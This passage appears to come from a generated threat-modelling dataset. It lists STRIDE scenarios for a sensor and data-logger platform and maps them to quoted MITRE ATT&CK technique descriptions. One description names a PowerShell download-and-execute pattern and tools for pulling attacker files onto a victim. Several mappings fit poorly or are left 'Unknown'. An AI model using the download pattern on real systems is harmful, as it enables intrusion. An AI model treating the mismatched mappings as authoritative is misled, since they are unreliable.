                "description": "Adversaries may establish persistence and/or elevate privileges using system mechanisms that trigger execution based on specific events. Various operating systems have means to monitor and subscribe to events such as logons or other user activity such as running specific applications/binaries. Cloud environments may also support various functions and services that monitor and can be invoked in response to specific cloud events.(Citation: Backdooring an AWS account)(Citation: Varonis Power Automate Data Exfiltration)(Citation: Microsoft DART Case Report 001)\n\nAdversaries may abuse these mechanisms as a means of maintaining persistent access to a victim via repeatedly executing malicious code. After gaining access to a victim system, adversaries may create/modify event triggers to point to malicious content that will be executed whenever the event trigger is invoked.(Citation: FireEye WMI 2015)(Citation: Malware Persistence on OS X)(Citation: amnesia malware)\n\nSince the execution can be proxied by an account with higher permissions, such as SYSTEM or service accounts, an adversary may be able to abuse these triggered execution mechanisms to escalate their privileges. ",
                "id": "attack-pattern--b6301b64-ef57-4cce-bb0b-77026f14a8db",
                "technique_id": "T1546"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An external adversary performs malicious actions, but denies it due to weak or non-existent logging of external interactions.",
            "Assumptions": [
                {
                    "Assumption": "External interactions are not logged or monitored.",
                    "Role": "System Administrator",
                    "Condition": "Valid if logging mechanisms are inadequate for external accesses."
                },
                {
                    "Assumption": "No mechanism to verify the authenticity of external actions.",
                    "Role": "Security Team",
                    "Condition": "Valid if action verification is not enforced."
                },
                {
                    "Assumption": "Security policies do not include extensive logging requirements.",
                    "Role": "IT Policy Maker",
                    "Condition": "Valid if security policies are lacking."
                }
            ],
            "Potential Impact": "Complications in incident response and forensic investigations, potentially allowing malicious actions to go unpunished.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "external adversary",
                "logging failure",
                "audit trail"
            ],
            "mitre_technique": {
                "name": "Ingress Tool Transfer",
                "description": "Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as [ftp](https://attack.mitre.org/software/S0095). Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570)). \n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, [certutil](https://attack.mitre.org/software/S0160), and [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.(Citation: t1105_lolbas)\n\nAdversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by [User Execution](https://attack.mitre.org/techniques/T1204) (typically after interacting with [Phishing](https://attack.mitre.org/techniques/T1566) lures).(Citation: T1105: Trellix_search-ms)\n\nFiles can also be transferred using various [Web Service](https://attack.mitre.org/techniques/T1102)s as well as native or otherwise present tools on the victim system.(Citation: PTSecurity Cobalt Dec 2016) In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.(Citation: Dropbox Malware Sync)",
                "id": "attack-pattern--e6919abc-99f9-4c6c-95a5-14761e7b2add",
                "technique_id": "T1105"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A supplier of the Data Logger could deny responsibility for data inconsistencies found in their equipment due to lack of audit tracking.",
            "Assumptions": [
                {
                    "Assumption": "There are no audit logs tracking the consistency and integrity of the data received from Data Loggers.",
                    "Role": "System Administrator",
                    "Condition": "Valid if audit logging for data consistency is absent."
                },
                {
                    "Assumption": "Data discrepancies are not systematically tracked.",
                    "Role": "Quality Assurance Team",
                    "Condition": "Valid if data tracking mechanisms are inadequate."
                },
                {
                    "Assumption": "Accountability mechanisms are not outlined in supplier agreements.",
                    "Role": "Legal/Procurement Team",
                    "Condition": "Valid if agreements do not specify responsibility tracking."
                }
            ],
            "Potential Impact": "Difficulty in assigning responsibility and addressing data inconsistencies, leading to reduced trust and potential operational issues.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "data logger",
                "audit failure",
                "supplier accountability"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker could intercept data between the Data Logger and the Receiver, disclosing sensitive information.",
            "Assumptions": [
                {
                    "Assumption": "Network traffic between the Data Logger and Receiver is not encrypted.",
                    "Role": "System Administrator",
                    "Condition": "Valid if encryption is not enforced."
                },
                {
                    "Assumption": "The attacker has the capability to access the network traffic.",
                    "Role": "Attacker",
                    "Condition": "Valid if network security is weak or compromised."
                },
                {
                    "Assumption": "No network monitoring to detect unauthorized access.",
                    "Role": "Security Team",
                    "Condition": "Valid if monitoring tools are inadequate or absent."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive sensor data, leading to potential security and operational risks.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "network traffic",
                "data interception",
                "encryption failure"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "A compromised Anonymity Agent inadvertently leaks pre-processed sensor data.",
            "Assumptions": [
                {
                    "Assumption": "The Anonymity Agent has exploitable vulnerabilities.",
                    "Role": "Developer/Security Team",
                    "Condition": "Valid if software is not updated or patched."
                },
                {
                    "Assumption": "Security measures do not cover the data pre-processing stage.",
                    "Role": "System Administrator",
                    "Condition": "Valid if pre-processing security is overlooked."
                },
                {
                    "Assumption": "Network communication involving the Anonymity Agent is not secured.",
                    "Role": "System Administrator",
                    "Condition": "Valid if network security is weak."
                }
            ],
            "Potential Impact": "Leakage of anonymized yet potentially sensitive data, undermining privacy and leading to data breaches.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "anonymity agent",
                "data leakage",
                "pre-processed data"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An insider could access and disclose sensitive metadata from the TOREADOR platform.",
            "Assumptions": [
                {
                    "Assumption": "The insider has legitimate access to the metadata.",
                    "Role": "Insider",
                    "Condition": "Valid if access controls are weak or insufficient."
                },
                {
                    "Assumption": "There are no adequate logging and monitoring controls for metadata interactions.",
                    "Role": "System Administrator",
                    "Condition": "Valid if monitoring is inadequate."
                },
                {
                    "Assumption": "Security policies do not enforce the principle of least privilege.",
                    "Role": "IT Policy Maker",
                    "Condition": "Valid if policies are lacking."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive operational and contextual metadata, leading to privacy violations and potential competitive disadvantage.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "insider threat",
                "sensitive metadata",
                "access control"
            ],
            "mitre_technique": {
                "name": "Valid Accounts",
                "description": "Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop.(Citation: volexity_0day_sophos_FW) Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.\n\nIn some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.(Citation: CISA MFA PrintNightmare)\n\nThe overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.(Citation: TechNet Credential Theft)",
                "id": "attack-pattern--b17a1a56-e99c-403c-8948-561df0cffe81",
                "technique_id": "T1078"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An external attacker launches a distributed denial of service (DDoS) attack on the network communication channels.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can coordinate multiple compromised devices to flood the network.",
                    "Role": "Attacker",
                    "Condition": "Valid if DDoS protection mechanisms are inadequate."
                },
                {
                    "Assumption": "Network infrastructure is not resilient to high traffic volumes.",
                    "Role": "Network Administrator",
                    "Condition": "Valid if network capacity planning is insufficient."
                },
                {
                    "Assumption": "No redundancy or failover mechanisms are in place.",
                    "Role": "System Architect",
                    "Condition": "Valid if redundancy planning is absent."
                }
            ],
            "Potential Impact": "Disruption in data communication, leading to system downtime and interruption of predictive maintenance and power flow optimization.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "DDoS",
                "network traffic",
                "service disruption"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "A malicious actor causes excessive load on the TOREADOR platform by sending malformed or excessive data.",
            "Assumptions": [
                {
                    "Assumption": "There are no rate limiting controls for incoming data.",
                    "Role": "System Administrator",
                    "Condition": "Valid if rate limiting is not enforced."
                },
                {
                    "Assumption": "The platform is not designed to handle malformed data effectively.",
                    "Role": "Developer",
                    "Condition": "Valid if input validation is weak."
                },
                {
                    "Assumption": "No monitoring or alerting mechanism for unusual data patterns.",
                    "Role": "Security Team",
                    "Condition": "Valid if monitoring capabilities are inadequate."
                }
            ],
            "Potential Impact": "System overload results in service unavailability, impacting predictive maintenance and power optimization functions.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "data injection",
                "system overload",
                "input validation"
            ],
            "mitre_technique": {
                "name": "Application Exhaustion Flood",
                "description": "Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport Jan 2018)",
                "id": "attack-pattern--18cffc21-3260-437e-80e4-4ab8bf2ba5e9",
                "technique_id": "T1499.003"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An internal actor deliberately causes a high load on the Dashboard by automating excessive login attempts.",
            "Assumptions": [
                {
                    "Assumption": "Rate limiting or failure count mechanisms are not implemented for login attempts.",
                    "Role": "System Administrator",
                    "Condition": "Valid if such security mechanisms are not in place."
                },
                {
                    "Assumption": "Security monitoring does not detect anomalous login attempts.",
                    "Role": "Security Team",
                    "Condition": "Valid if monitoring and alerting are weak."
                },
                {
                    "Assumption": "No multi-factor authentication is enforced.",
                    "Role": "System Administrator",
                    "Condition": "Valid if MFA is not implemented."
                }
            ],
            "Potential Impact": "Login system performance degrades, causing unavailability for legitimate users and potential operational delays.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "login attempts",
                "rate limiting",
                "dashboard"
            ],
            "mitre_technique": {
                "name": "Application Exhaustion Flood",
                "description": "Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport Jan 2018)",
                "id": "attack-pattern--18cffc21-3260-437e-80e4-4ab8bf2ba5e9",
                "technique_id": "T1499.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a zero-day vulnerability in the TOREADOR platform to gain higher access levels.",
            "Assumptions": [
                {
                    "Assumption": "The attacker is aware of and can exploit the zero-day vulnerability.",
                    "Role": "Attacker",
                    "Condition": "Valid if the vulnerability exists and is exploitable."
                },
                {
                    "Assumption": "No patches or mitigations are available or applied for the zero-day vulnerability.",
                    "Role": "System Administrator",
                    "Condition": "Valid if the system is not up-to-date."
                },
                {
                    "Assumption": "There is no segmentation of privileges within the platform.",
                    "Role": "System Architect",
                    "Condition": "Valid if privilege segmentation is weak."
                }
            ],
            "Potential Impact": "Attacker gains admin-level access, potentially compromising the entire AI/ML model training and deployment process.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "zero-day",
                "vulnerability exploitation",
                "admin access"
            ],
            "mitre_technique": {
                "name": "Exploitation for Defense Evasion",
                "description": "Adversaries may exploit a system or application vulnerability to bypass security features. Exploitation of a vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0Vulnerabilities may exist in defensive security software that can be used to disable or circumvent them.\n\nAdversaries may have prior knowledge through reconnaissance that security software exists within an environment or they may perform checks during or shortly after the system is compromised for [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001). The security software will likely be targeted directly for exploitation. There are examples of antivirus software being targeted by persistent threat groups to avoid detection.\n\nThere have also been examples of vulnerabilities in public cloud infrastructure of SaaS applications that may bypass defense boundaries (Citation: Salesforce zero-day in facebook phishing attack), evade security logs (Citation: Bypassing CloudTrail in AWS Service Catalog), or deploy hidden infrastructure.(Citation: GhostToken GCP flaw)",
                "id": "attack-pattern--fe926152-f431-4baf-956c-4ad3cb0bf23b",
                "technique_id": "T1211"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An insider with limited access exploits weak access controls to gain administrative privileges on the Dashboard.",
            "Assumptions": [
                {
                    "Assumption": "Access controls are insufficiently restrictive.",
                    "Role": "System Administrator",
                    "Condition": "Valid if access control policies are weak."
                },
                {
                    "Assumption": "There is no separation of duties enforced within the system.",
                    "Role": "IT Policy Maker",
                    "Condition": "Valid if role-based access controls are lacking."
                },
                {
                    "Assumption": "Logging and monitoring do not cover privilege escalation attempts.",
                    "Role": "Security Team",
                    "Condition": "Valid if logging mechanisms are inadequate."
                }
            ],
            "Potential Impact": "Gaining unauthorized admin-level access allows the insider to manipulate system data and controls, compromising system integrity and confidentiality.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "insider threat",
                "access control",
                "privilege escalation"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A compromised sensor node is used by an attacker to escalate privileges within the network.",
            "Assumptions": [
                {
                    "Assumption": "The sensor node software contains vulnerabilities.",
                    "Role": "Developer",
                    "Condition": "Valid if not frequently updated or patched."
                },
                {
                    "Assumption": "Network segmentation is not properly enforced.",
                    "Role": "Network Administrator",
                    "Condition": "Valid if network segmentation is weak."
                },
                {
                    "Assumption": "The compromised node has sufficient initial privileges to escalate further.",
                    "Role": "Attacker",
                    "Condition": "Valid if initial access level allows privilege escalation."
                }
            ],
            "Potential Impact": "Compromised sensor node allows the attacker to move laterally within the network, accessing sensitive components and data.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "sensor node",
                "network segmentation",
                "lateral movement"
            ],
            "mitre_technique": {
                "name": "Distributed Component Object Model",
                "description": "Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to interact with remote machines by taking advantage of Distributed Component Object Model (DCOM). The adversary may then perform actions as the logged-on user.\n\nThe Windows Component Object Model (COM) is a component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces. Through COM, a client object can call methods of server objects, which are typically Dynamic Link Libraries (DLL) or executables (EXE). Distributed COM (DCOM) is transparent middleware that extends the functionality of COM beyond a local computer using remote procedure call (RPC) technology.(Citation: Fireeye Hunting COM June 2019)(Citation: Microsoft COM)\n\nPermissions to interact with local and remote server COM objects are specified by access control lists (ACL) in the Registry.(Citation: Microsoft Process Wide Com Keys) By default, only Administrators may remotely activate and launch COM objects through DCOM.(Citation: Microsoft COM ACL)\n\nThrough DCOM, adversaries operating in the context of an appropriately privileged user can remotely obtain arbitrary and even direct shellcode execution through Office applications(Citation: Enigma Outlook DCOM Lateral Movement Nov 2017) as well as other Windows objects that contain insecure methods.(Citation: Enigma MMC20 COM Jan 2017)(Citation: Enigma DCOM Lateral Movement Jan 2017) DCOM can also execute macros in existing documents(Citation: Enigma Excel DCOM Sept 2017) and may also invoke [Dynamic Data Exchange](https://attack.mitre.org/techniques/T1559/002) (DDE) execution directly through a COM created instance of a Microsoft Office application(Citation: Cyberreason DCOM DDE Lateral Movement Nov 2017), bypassing the need for a malicious document. DCOM can be used as a method of remotely interacting with [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047). (Citation: MSDN WMI)",
                "id": "attack-pattern--68a0c5ed-bee2-4513-830d-5b0d650139bd",
                "technique_id": "T1021.003"
            }
        }
    ]
},
{
    "case_number": "9",
    "batch_number": "25",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker pretends to be a valid sensor to send fake data to the Data Logger.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can gain physical access or has network access to the sensor network.",
                    "Role": "Attacker",
                    "Condition": "The attacker must penetrate network defenses or physically access sensor sites."
                },
                {
                    "Assumption": "The attacker can replicate the sensor communication protocol.",
                    "Role": "Attacker",
                    "Condition": "The attacker must understand and replicate sensor communication."
                },
                {
                    "Assumption": "The Data Logger does not robustly authenticate sensor data.",
                    "Role": "System Developer",
                    "Condition": "The authentication mechanism of the Data Logger is weak or absent."
                }
            ],
            "Potential Impact": "Compromises data integrity leading to inaccurate predictions and potential disruption of power flow optimization.",
            "MITRE ATT&CK Keywords": [
                "Spoofing",
                "Network",
                "Device",
                "Sensor"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker spoofs an employee's login credentials to access the dashboard.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can obtain or guess user credentials.",
                    "Role": "Attacker",
                    "Condition": "Weak password policies or compromised credentials."
                },
                {
                    "Assumption": "The application does not employ multi-factor authentication (MFA).",
                    "Role": "System Administrator",
                    "Condition": "Absence of MFA in authentication process."
                },
                {
                    "Assumption": "The attacker has network access to the LIGHT platform.",
                    "Role": "Attacker",
                    "Condition": "The attacker is on the same network or can remotely access the application."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive data and system control, impacting data confidentiality and operational integrity.",
            "MITRE ATT&CK Keywords": [
                "Spoofing",
                "Credentials",
                "Dashboard",
                "Access"
            ],
            "mitre_technique": {
                "name": "Password Guessing",
                "description": "Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.\n\nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver)\n\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n* SNMP (161/UDP and 162/TCP/UDP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018). Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.(Citation: Trend Micro Emotet 2020)\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.",
                "id": "attack-pattern--09c4c11e-4fa1-4f8c-8dad-3cf8e69ad119",
                "technique_id": "T1110.001"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker spoofs the network communication interface to impersonate the Data Logger when sending data to the Receiver.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can intercept and mimic the network communications of the Data Logger.",
                    "Role": "Attacker",
                    "Condition": "Access to the network traffic between Data Logger and Receiver."
                },
                {
                    "Assumption": "There is a lack of encryption and authentication in the data transmission process.",
                    "Role": "System Developer",
                    "Condition": "Transmissions are in plaintext without strong authentication mechanisms."
                },
                {
                    "Assumption": "The system does not detect anomalously behaving network entities.",
                    "Role": "Security Analyst",
                    "Condition": "No anomaly detection systems are in place."
                }
            ],
            "Potential Impact": "Data integrity is compromised, impacting the accuracy of AI/ML models and potentially disrupting power optimization functions.",
            "MITRE ATT&CK Keywords": [
                "Spoofing",
                "Network",
                "Communication",
                "Impersonation"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies data in transit between sensors and the Data Logger.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can access the communication channels between sensors and the Data Logger.",
                    "Role": "Attacker",
                    "Condition": "The communication channel is unsecured or weakly protected."
                },
                {
                    "Assumption": "Transmission data is not encrypted.",
                    "Role": "System Developer",
                    "Condition": "Unauthenticated and unencrypted data transmissions."
                },
                {
                    "Assumption": "There are insufficient integrity checks for received data.",
                    "Role": "System Administrator",
                    "Condition": "Lack of data integrity verification mechanisms."
                }
            ],
            "Potential Impact": "Leads to corrupted data being used in AI/ML model training, resulting in unreliable predictions and power flow disruptions.",
            "MITRE ATT&CK Keywords": [
                "Tampering",
                "Data",
                "Communication",
                "Encryption"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
